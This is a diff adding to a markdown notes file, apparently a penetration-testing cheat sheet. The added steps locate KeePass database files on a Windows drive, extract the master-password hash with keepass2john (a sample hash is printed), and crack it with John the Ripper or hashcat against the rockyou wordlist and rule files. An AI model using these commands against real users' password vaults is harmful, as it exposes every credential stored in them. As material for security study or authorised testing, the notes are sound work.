@@ -1,5 +1,41 @@
-# Interacting With KeyPass via Terminal
+# Locate a KeePass Database file
+```bash
+# Open Powershell and run:
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+```
+![alt text](image-5.png)
 
+## John the Ripper
+
+```bash
+# Step 1: Extract the hash
+keepass2john FILE > hash.txt
+
+#Example
+keepass2john Database.kdbx > hash.txt
+  
+cat hash.txt                    
+Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
+
+#NOTE: JTR automatically put the file name "Database" as the username of the hash. However in the instance of KeePass, it uses a master password without an associated username. So we need to remove it.
+
+$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
+
+# Step 2: Crack Extracted Hash
+
+john EXTRACTED HASH FILE --wordlist=/usr/share/wordlists/rockyou.txt
+
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+#Or with Hashcat
+hashcat -m 13400 hash.txt /usr/share/wordlists/rockyou.txt --force
+
+#Hashcat with Mutatated Wordlist
+hashcat -m 13400 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force 
+
+# NOTE: You can utilize Hashcat for this step. Its also worth noting this is not a traditional hash, so `hashid` command will not work. Instead search online or through hashcat -h or through Johns help file.
+```
+# Interacting With KeyPass via Terminal
 ```bash
 
 #Navigate to database file location.
